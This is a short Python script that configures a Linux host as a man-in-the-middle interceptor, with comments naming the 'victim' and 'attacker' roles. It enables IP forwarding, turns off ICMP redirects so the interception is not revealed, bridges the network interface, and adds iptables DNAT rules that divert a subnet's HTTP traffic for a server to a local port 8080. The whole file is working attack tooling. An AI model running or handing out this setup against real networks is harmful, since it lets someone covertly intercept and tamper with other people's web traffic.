from scapy.all import *
import subprocess

def run(cmd):
    subprocess.run(cmd, shell=True, check=True)
    
# Enables kernel forwarding, which allows for fast forwarding from victim -> attacker -> destination
def enable_kernel_forwarding(interface):
	# Enable IP forwarding
	# This rewrites L2 headers without touching anything else
	run("sysctl -w net.ipv4.ip_forward=1")
    
	# Prevent ICMP redirects from showing
	run("sysctl -w net.ipv4.conf.all.send_redirects=0")
	run(f"sysctl -w net.ipv4.conf.{interface}.send_redirects=0")

# Revert the changes made in enable_kernel_forwarding
def cleanup_forward(interface):
	run("sysctl -w net.ipv4.ip_forward=0")
	run("sysctl -w net.ipv4.conf.all.send_redirects=1")
	run(f"sysctl -w net.ipv4.conf.{interface}.send_redirects=1")

def setup_bridge(self_ip, router_ip, interface, subnet="24"):
	#disable NetworkManager
	run("nmcli device set eth0 managed no")
	# Load module and enable bridge iptables
	run("modprobe br_netfilter")
	run("sysctl -w net.bridge.bridge-nf-call-iptables=1")
    
	# Remove existing bridge if it exists
	if subprocess.run(f"ip link show br0", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
		run("ip link set br0 down")
		run("ip link delete br0")
    
	# Create bridge
	run("ip link add br0 type bridge")
    
	# Flush interface IP and add to bridge
	run(f"ip addr flush dev {interface}")
	run(f"ip link set {interface} up")
	run(f"ip link set {interface} master br0")
    
	# Assign IP to bridge
	run(f"ip addr add {self_ip}/{subnet} dev br0")
    
	# Bring bridge up
	run("ip link set br0 up")
    
	# Add default route
	run(f"ip route add default via {router_ip}")
    
	# Enable forwarding and disable reverse path filter
	run("sysctl -w net.ipv4.ip_forward=1")
	run("sysctl -w net.ipv4.conf.all.rp_filter=0")
    
def setup_iptables(server_ip, self_ip):
	run("iptables -F")
	run("iptables -t nat -F")
	run(f"iptables -t nat -A PREROUTING -s 192.168.1.0/24 -d {server_ip} -p tcp --dport 80 -j DNAT --to-destination {self_ip}:8080")
	run("iptables -A INPUT -p tcp --dport 8080 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT")
	run("iptables -A OUTPUT -p tcp --sport 8080 -m conntrack --ctstate ESTABLISHED -j ACCEPT")
	run("iptables -A FORWARD -p tcp --dport 8080 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT")
	run("iptables -A FORWARD -p tcp --sport 8080 -m conntrack --ctstate ESTABLISHED -j ACCEPT")
    
# Example usage
setup_bridge("192.168.1.102", "192.168.1.1", "eth0")
setup_iptables("192.168.2.100", "192.168.1.102")
	
